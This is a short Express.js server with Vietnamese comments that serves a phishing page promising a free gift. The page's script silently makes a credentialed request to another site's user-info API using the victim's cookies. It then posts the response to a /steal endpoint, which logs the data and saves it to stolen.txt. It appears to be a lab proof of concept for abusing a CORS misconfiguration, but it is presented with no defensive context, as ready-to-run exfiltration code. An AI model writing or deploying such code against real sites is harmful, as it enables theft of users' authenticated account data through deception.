const express = require("express");
const fs = require("fs");

const app = express();
const PORT = 3006;

app.use(express.json());

// Phục vụ trang lừa đảo
app.get("/", (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Bấm vào đây để nhận quà miễn phí!</title>
        </head>
        <body>
            <script>
                fetch("https://siteA.com/api/userinfo", {
                    credentials: "include" // Gửi cookie của nạn nhân
                })
                .then(response => response.text())
                .then(data => {
                    fetch("http://localhost:3006/steal", { // Gửi dữ liệu về server của bạn
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ stolenData: data })
                    });
                })
                .catch(err => console.log("Bypass CORS failed:", err));
            </script>
            <h1>Bấm vào đây để nhận quà miễn phí!</h1>
        </body>
        </html>
    `);
});

// Nhận dữ liệu đánh cắp từ nạn nhân
app.post("/steal", (req, res) => {
    const data = req.body;
    console.log("Received stolen data:", data);

    // Lưu dữ liệu vào file
    fs.appendFileSync("stolen.txt", JSON.stringify(data) + "\n");

    res.send("OK");
});

// Bắt đầu lắng nghe trên cổng PORT
app.listen(PORT, () => {
    console.log(`Server đang lắng nghe trên http://localhost:${PORT}`);
});

